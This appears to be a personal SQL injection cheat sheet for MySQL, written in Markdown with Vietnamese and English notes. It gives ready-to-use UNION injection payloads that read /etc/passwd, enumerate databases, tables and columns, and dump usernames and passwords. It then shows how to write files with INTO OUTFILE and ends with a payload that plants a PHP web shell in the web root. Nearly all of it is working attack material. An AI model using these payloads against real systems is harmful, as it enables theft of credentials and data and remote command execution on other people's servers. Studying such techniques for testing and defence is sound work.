# MY SQL INJECTION

## User
`USER()`

## Load_File
- Read system file 

```sql
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
- Read source code file in server => path apache web ( /var/www/html/...php )
```sql

```

## Version
`@@version`

## Database 
```sql
' UNION SELECT 1,SCHEMA_NAME,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

- Columns **SCHEMA_NAME** chứa all tên của database hiện tại
- Metadata **INFORMATION_SCHEMA** siêu dữ liệu database và table trên server 
- Table **SCHEMA** chứa tên all database
- Ta cũng có thể lấy tên database hiện tại qua hàm **database()**

```sqli
' UNION select 1,database(),2,3-- -
```

## TABLES
```sql
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

- Columns **TABLE_NAME* chứa all tên của tables hiện tại
- Colums **TABLE_SCHEMA** chứa tên csdl của tables đang trỏ đến
- Table **INFORMATION_SCHEMA.TABLES** siêu dữ liệu chứa all table trên server 
- table_schema='dev' ví dụ ta có tên csdl là dev và truy vấn all các table trên csdl dev đó 

## Columns 
```sql
' UNION select 1,COLUMN_NAME,TABLE_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='devss'-- -
```

- Columns **COLUMN_NAME* chứa all tên của columns hiện tại trên table 
- Table **INFORMATION_SCHEMA.COLUMNS** siêu dữ liệu chứa all column trong table
- table_name='devss' ví dụ ta lấy được tên table là devss và truy vấn all các columns trên tables devss đó thông qua metadata column 

## DATA
```sql
' UNION select 1, username, password, 4 from dev.devss-- -
```

- dev.devss là tables hiện tại csdl_name.table_name

## Write file 
- SELECT .. INTO OUTFILE 'path_file' statement can be used to write data from select queries into file
Ex1: select queries usernamae in table users and save output into /var/www/html/username file
`SQL query :`
```sql
select user from users into outfile '/var/www/html/username';
```

`Cmd`
```cmd
cat /var/www/html/username 
>
1. admin
2. user1
3. user2
```
Ex2: 
```sql
SELECT 'hello' INTO OUTFILE '/var/test.txt';
```

## Web shell
```sql
' union select 1,'<?php system($_REQUEST[0]); ?>',3 ,4 into outfile '/var/www/html/shell.php'-- - 
```

